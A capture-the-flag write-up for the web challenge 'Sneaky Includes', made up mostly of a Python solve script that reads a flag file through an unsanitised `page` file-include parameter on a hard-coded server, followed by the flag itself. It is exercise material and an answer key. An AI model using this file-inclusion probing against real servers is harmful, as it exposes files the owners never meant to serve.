---
title: "Sneaky Includes"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Sneaky Includes

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Sneaky Includes — safctf

The `page` query parameter is passed straight to a server-side file include.
The flag sits in the app's working directory, so a bare filename resolves it.

    python3 solve.py
"""
import urllib.parse
import urllib.request

TARGET = "http://54.72.82.22:8030"


def fetch(page: str) -> str:
    url = f"{TARGET}/?" + urllib.parse.urlencode({"page": page})
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode(errors="replace")


def main() -> None:
    for candidate in ("flag.txt", "/flag.txt", "flag", "/flag"):
        body = fetch(candidate)
        if "safctf{" in body:
            print(f"page={candidate!r} -> {body.strip()}")
            return
        print(f"page={candidate!r} -> miss ({len(body)}B)")
    print("no flag found")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{9fdb535dbf8020d488bf8d6a51287778}
```
